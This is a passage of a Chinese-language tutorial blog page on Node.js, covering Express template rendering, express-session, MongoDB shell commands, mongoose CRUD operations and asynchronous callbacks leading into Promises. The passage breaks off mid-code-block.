javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">res.render(<span class="string">'index.html'</span>, &#123;</span><br><span class="line">    students: students.students</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="初识（数据渲染）"><a href="#初识（数据渲染）" class="headerlink" title="初识（数据渲染）"></a>初识（数据渲染）</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/public'</span>, express.static(<span class="string">'./public/'</span>))</span><br><span class="line">app.use(<span class="string">'/node_modules/'</span>, express.static(<span class="string">'./node_modules/'</span>))</span><br><span class="line"></span><br><span class="line">app.engine(<span class="string">'html'</span>, <span class="built_in">require</span>(<span class="string">'express-art-template'</span>))</span><br><span class="line">app.set(<span class="string">'/views'</span>, <span class="string">'./views/'</span>) <span class="comment">//可以更改模板引擎默认调用资源文件夹路径,注意书写</span></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    fs.readFile(<span class="string">'db.json'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">'数据有误'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// console.log(JSON.parse(data))</span></span><br><span class="line">        <span class="keyword">var</span> students = <span class="built_in">JSON</span>.parse(data)</span><br><span class="line">        res.render(<span class="string">'index.html'</span>, &#123;</span><br><span class="line">            students: students.students</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'server is running...'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="express-session"><a href="#express-session" class="headerlink" title="express-session"></a>express-session</h2><p>官方文档：<a href="https://github.com/expressjs/session" target="_blank" rel="noopener">https://github.com/expressjs/session</a></p><h3 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i express-session</span><br></pre></td></tr></table></figure><h3 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h3><ul><li>该插件会为req请求对象添加一个成员:req.session默认是一个对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//配置session中间件</span></span><br><span class="line">app.use(session(&#123;</span><br><span class="line"><span class="comment">//自定义字符串来对sessionid进行加密处理，避免出现相同的sessionid</span></span><br><span class="line">    secret: <span class="string">'dong yi'</span>,</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">//无论是否使用了session，设置为true都会默认都会给予钥匙(sessionid)</span></span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">    cookie: &#123; <span class="attr">secure</span>: <span class="literal">true</span> &#125;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写</span></span><br><span class="line"><span class="comment">//添加Session数据</span></span><br><span class="line"><span class="comment">//session就是一个对象</span></span><br><span class="line">req.session.foo = <span class="string">'bar'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读</span></span><br><span class="line"><span class="comment">//获取session数据</span></span><br><span class="line">req.session.foo</span><br><span class="line"></span><br><span class="line"><span class="comment">//删</span></span><br><span class="line">req.session.foo = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">delete</span> req.session.foo <span class="comment">//推荐</span></span><br></pre></td></tr></table></figure><h3 id="其它-1"><a href="#其它-1" class="headerlink" title="其它"></a>其它</h3><p>session：保存登录选项，🔺在内存中存储</p><p>cookie：保存不敏感数据</p><h1 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h1><p>案例：案例4 学生信息（增删改-mongoose）</p><h2 id="关系型和非关系型数据库"><a href="#关系型和非关系型数据库" class="headerlink" title="关系型和非关系型数据库"></a>关系型和非关系型数据库</h2><h3 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h3><p>表就是关系，或者说表与表之间存在关系</p><ul><li>所有的关系型数据库都需要通过<code>sql</code>语言来操作</li><li>所有的关系型数据库在操作之前都需要设计表结构</li><li>而且数据表还支持约束<ul><li>唯一的</li><li>主键</li><li>默认值</li><li>非空</li></ul></li></ul><h3 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h3><ul><li>非关系型数据库非常的灵活</li><li>有的关系型数据库就是key-value对</li><li>但MongDB是长得最像关系型数据库的非关系型数据库<ul><li>数据库 -》 数据库</li><li>数据表 -》 集合（数组）</li><li>表记录 -》文档对象</li></ul></li></ul><p>一个数据库中可以有多个数据库，一个数据库中可以有多个集合（数组），一个集合中可以有多个文档（表记录）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//也就是说你可以任意的往里面存数据，没有结构性这么一说</span></span><br><span class="line">&#123;</span><br><span class="line">    qq（数据库）:&#123;</span><br><span class="line">       user（集合）:[</span><br><span class="line">           &#123;（文档）&#125;,&#123;&#125;,&#123;&#125;...</span><br><span class="line">       ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="安装-4"><a href="#安装-4" class="headerlink" title="安装"></a>安装</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul><li>地址：<a href="https://www.mongodb.com/download-center/community" target="_blank" rel="noopener">https://www.mongodb.com/download-center/community</a></li></ul><h3 id="🔺环境配置（安装）"><a href="#🔺环境配置（安装）" class="headerlink" title="🔺环境配置（安装）"></a>🔺环境配置（安装）</h3><ul><li>地址：<a href="https://www.cnblogs.com/xiaozhaoboke/p/11479144.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozhaoboke/p/11479144.html</a></li></ul><h3 id="node使用（npm）"><a href="#node使用（npm）" class="headerlink" title="node使用（npm）"></a>node使用（npm）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i mongoose</span><br></pre></td></tr></table></figure><h3 id="检测环境"><a href="#检测环境" class="headerlink" title="检测环境"></a>检测环境</h3><p>控制台输入<code>mongod --version</code></p><h2 id="启动和关闭数据库"><a href="#启动和关闭数据库" class="headerlink" title="启动和关闭数据库"></a>启动和关闭数据库</h2><p>启动数据库服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --dbpath D:\mongodb\data\db</span><br></pre></td></tr></table></figure><p>关闭服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.在开启服务的控制台，直接Ctrl+C;</span><br><span class="line">2.直接关闭开启服务的控制台。</span><br></pre></td></tr></table></figure><p>启动数据库，连接本地MongoDB服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br></pre></td></tr></table></figure><p>退出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><h2 id="mongo基本命令"><a href="#mongo基本命令" class="headerlink" title="mongo基本命令"></a>mongo基本命令</h2><ul><li><p><code>show dbs</code></p><p>查看数据库列表(数据库中的所有数据库）</p></li><li><p><code>db</code></p><p>查看当前连接的数据库</p></li><li><p><code>use 数据库名称</code></p><p>切换到指定的数据库（没有会新建）</p></li><li><p><code>show collections</code></p><p>查看当前目录下的数据表</p></li><li><p><code>db.表名.find()</code></p><p>查看表中信息</p></li><li><p><code>InsertOne()</code></p><p>插入数据（对象形式，命名字符串加双引号）</p><p><img src= "/img/loading.gif" data-src="/2020/07/10/Node.JS/image-20200524113123433.png" alt="image-20200524113123433">    </p></li><li><p>dropDatabase()</p><p>删除数据库</p></li><li><p>db.collection.remove({})</p><p>删除文档</p></li><li><p>db.collection.drop()</p><p>删除集合</p></li></ul><h1 id="🔺Node中操作MongoDB"><a href="#🔺Node中操作MongoDB" class="headerlink" title="🔺Node中操作MongoDB"></a>🔺Node中操作MongoDB</h1><ul><li><p>使用官网mongoDB包操作：</p><p><a href="http://mongodb.github.io/node-mongodb-native/" target="_blank" rel="noopener">http://mongodb.github.io/node-mongodb-native/</a></p></li><li><p>第三方包<code>mongoose</code>操作MongoDB数据库</p><p><a href="https://mongoosejs.com/" target="_blank" rel="noopener">https://mongoosejs.com/</a></p><p>官方学习文档</p><p><a href="https://mongoosejs.com/docs/index.html" target="_blank" rel="noopener">https://mongoosejs.com/docs/index.html</a></p></li></ul><h2 id="mongoose初识"><a href="#mongoose初识" class="headerlink" title="mongoose初识"></a>mongoose初识</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引包</span></span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</span><br><span class="line"><span class="comment">//创建数据库</span></span><br><span class="line">mongoose.connect(<span class="string">'mongodb://localhost:27017/test'</span>, &#123;<span class="attr">useNewUrlParser</span>: <span class="literal">true</span>, <span class="attr">useUnifiedTopology</span>: <span class="literal">true</span>&#125;);</span><br><span class="line"><span class="comment">//定义集合</span></span><br><span class="line"><span class="keyword">const</span> Cat = mongoose.model(<span class="string">'Cat'</span>, &#123; <span class="attr">name</span>: <span class="built_in">String</span> &#125;);</span><br><span class="line"><span class="comment">//添加数据</span></span><br><span class="line"><span class="keyword">const</span> kitty = <span class="keyword">new</span> Cat(&#123; <span class="attr">name</span>: <span class="string">'Zildjian'</span> &#125;);</span><br><span class="line"><span class="comment">//保存成功提示（ES6）</span></span><br><span class="line">kitty.save().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'meow'</span>));</span><br></pre></td></tr></table></figure><h2 id="设计文档结构（表结构）"><a href="#设计文档结构（表结构）" class="headerlink" title="设计文档结构（表结构）"></a>设计文档结构（表结构）</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引用架构对象</span></span><br><span class="line"><span class="keyword">var</span> Schema = mongoose.Schema</span><br><span class="line"><span class="comment">//设计集合结构以及约束</span></span><br><span class="line"><span class="keyword">var</span> catSchema = <span class="keyword">new</span> Schema(&#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">        type: <span class="built_in">String</span>,</span><br><span class="line">        required: <span class="literal">true</span> <span class="comment">//约束:必须给值</span></span><br><span class="line">    &#125;,</span><br><span class="line">    age: &#123;</span><br><span class="line">        type: <span class="built_in">Number</span>,</span><br><span class="line">        required: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//创建集合并引用集合结构以及添加约束</span></span><br><span class="line"><span class="keyword">const</span> Cat = mongoose.model(<span class="string">'Cat'</span>, catSchema)</span><br></pre></td></tr></table></figure><h2 id="数据添加（增）"><a href="#数据添加（增）" class="headerlink" title="数据添加（增）"></a>数据添加（增）</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加数据（记录）</span></span><br><span class="line"><span class="keyword">const</span> kitty0 = <span class="keyword">new</span> Cat(&#123; <span class="attr">name</span>: <span class="string">'Zild'</span>, <span class="attr">age</span>: <span class="number">6</span> &#125;);</span><br><span class="line"><span class="keyword">const</span> kitty1 = <span class="keyword">new</span> Cat(&#123; <span class="attr">name</span>: <span class="string">'jian'</span>, <span class="attr">age</span>: <span class="number">7</span> &#125;);</span><br><span class="line"><span class="comment">//保存并提示（ES6）</span></span><br><span class="line">kitty0.save().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'meow'</span>));</span><br><span class="line">kitty1.save().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'meow'</span>));</span><br></pre></td></tr></table></figure><h2 id="数据删除（删）"><a href="#数据删除（删）" class="headerlink" title="数据删除（删）"></a>数据删除（删）</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Cat.deleteOne(&#123;<span class="attr">name</span>:<span class="string">'Zild'</span>&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err,ret</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(err)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'删除失败'</span>)</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(ret)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">Cat.deleteMany(&#123;<span class="attr">name</span>:<span class="string">'Zild'</span>&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err,ret</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(err)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'删除失败'</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>()&#123;</span><br><span class="line"><span class="built_in">console</span>.log(ret)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//remove方法官方不推荐使用，这里不考虑</span></span><br></pre></td></tr></table></figure><h2 id="数据更改（改）"><a href="#数据更改（改）" class="headerlink" title="数据更改（改）"></a>数据更改（改）</h2><ul><li>根据id</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Cat.where(&#123; <span class="attr">_id</span>: <span class="string">"5ec9c7012909a22e7c89b5ac"</span> &#125;).update(&#123; <span class="attr">name</span>: <span class="string">'Zild'</span>, <span class="attr">age</span>: <span class="number">8</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'更新失败'</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">Cat.findByIdAndUpdate(&#123; <span class="attr">_id</span>: <span class="string">"5ec9c7012909a22e7c89b5ac"</span> &#125;, &#123; <span class="attr">name</span>: <span class="string">'Zild'</span>, <span class="attr">age</span>: <span class="number">9</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"查询失败"</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret) <span class="comment">//返回修改前的数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>根据文档（记录）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cat.findOneAndUpdate(&#123; <span class="attr">name</span>: <span class="string">'Zild'</span> &#125;, &#123; <span class="attr">name</span>: <span class="string">'Zild1'</span>, <span class="attr">age</span>: <span class="number">9</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"查询失败"</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret) <span class="comment">//返回修改前的数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="数据查询（查）"><a href="#数据查询（查）" class="headerlink" title="数据查询（查）"></a>数据查询（查）</h2><p>查询全部</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cat.find(<span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"查询失败"</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>查询指定属性的全部对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cat.find(&#123; <span class="attr">name</span>: <span class="string">'Zild'</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"查询失败"</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>查询指定属性的单个对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cat.findOne(&#123; <span class="attr">name</span>: <span class="string">'Zild'</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"查询失败"</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="🔺异步编程"><a href="#🔺异步编程" class="headerlink" title="🔺异步编程"></a>🔺异步编程</h1><h2 id="得到函数内部异步操作的结果"><a href="#得到函数内部异步操作的结果" class="headerlink" title="得到函数内部异步操作的结果"></a>得到函数内部异步操作的结果</h2><p>回调函数：通过一个函数，获取函数内部的操作。（根据输入得到输出结果）</p><ul><li>在该情况下无法获得函数内异步操作的结果</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a + b)</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">        ret = a + b</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    &#125;, <span class="number">6000</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">3</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">get</span>(20,30))</span><br></pre></td></tr></table></figure><p>结果：返回<code>undefined</code></p><p><img src= "/img/loading.gif" data-src="/2020/07/10/Node.JS/image-20200524151737456.png" alt="image-20200524151737456">    </p><ul><li>若要获得该数据则只能通过回调函数</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a + b)</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">        ret = a + b</span><br><span class="line">        <span class="keyword">return</span> c(ret)</span><br><span class="line">    &#125;, <span class="number">6000</span>); </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">3</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(get(20,30))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span>(20, 30, function(a) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>结果</p><p><img src= "/img/loading.gif" data-src="/2020/07/10/Node.JS/image-20200524152155139.png" alt="image-20200524152155139">    </p><ul><li><p>注意：</p><p>凡是需要得到一个函数内部异步操作的结果（setTimeout,readFile,writeFile,ajax,readdir）</p><p>这种情况必须通过 回调函数 (异步API都会伴随着一个回调函数)</p></li></ul><h2 id="回调地狱"><a href="#回调地狱" class="headerlink" title="回调地狱"></a>回调地狱</h2><h3 id="啥是回调地狱"><a href="#啥是回调地狱" class="headerlink" title="啥是回调地狱"></a>啥是回调地狱</h3><p>就是这幅图（图源网络）</p><p><img src= "/img/loading.gif" data-src="/2020/07/10/Node.JS/image-20200527211637374.png" alt="image-20200527211637374"></p><h3 id="为什么会有回调地狱"><a href="#为什么会有回调地狱" class="headerlink" title="为什么会有回调地狱"></a>为什么会有回调地狱</h3><p>回调地狱的原因是，当人们试图以一种从上到下的视觉方式执行JavaScript的方式编写JavaScript时。期望第1行发生的任何事情都会在第2行的代码开始运行之前完成，但是，在JavaScript上，有时候这并没办法进行，比如，在你通过异步读取文件时，也就是用fs模块读取多个文件时</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'./a.txt'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'./b.txt'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'./c.txt'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>执行多次后，你会发现，有那么几次，也有可能好几次，看人品吧反正是，它是没有规则的读出来的（往往可能你的文件越大，读出来的时间会更久），也就是说，它并不会按照代码书写顺序去执行，这便是异步编程（如果试了没有，那就一直试，反正总会有的）。异步API导致了代码并不是按顺序执行的（可以读读这篇文章 <a href="https://www.jianshu.com/p/39adf6ab8ad1" target="_blank" rel="noopener">https://www.jianshu.com/p/39adf6ab8ad1</a> ——然后嘞，就会有上面那种解决方法，但是你会发现，代码非常的丑（别人是这样说的，反正我不是太这么认为，甚至觉得有点好看），还有非常难维护（这点认同）。所以就出现了几种解决方法 —Promise</p><h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><ul><li>Promise：承诺，保证</li><li>Promise本身不是异步的，但往往都是内部封装一个异步任务</li></ul><p>丢出一张图形容Promise函数，相当于一个容器（下图源于所学教程，pending（悬而未决的））</p><img src= "/img/loading.gif" data-src="/2020/07/10/Node.JS/image-20200527213850773.png" alt="image-20200527213850773" style="zoom: 200%;"><p>代码如下，较易维护</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 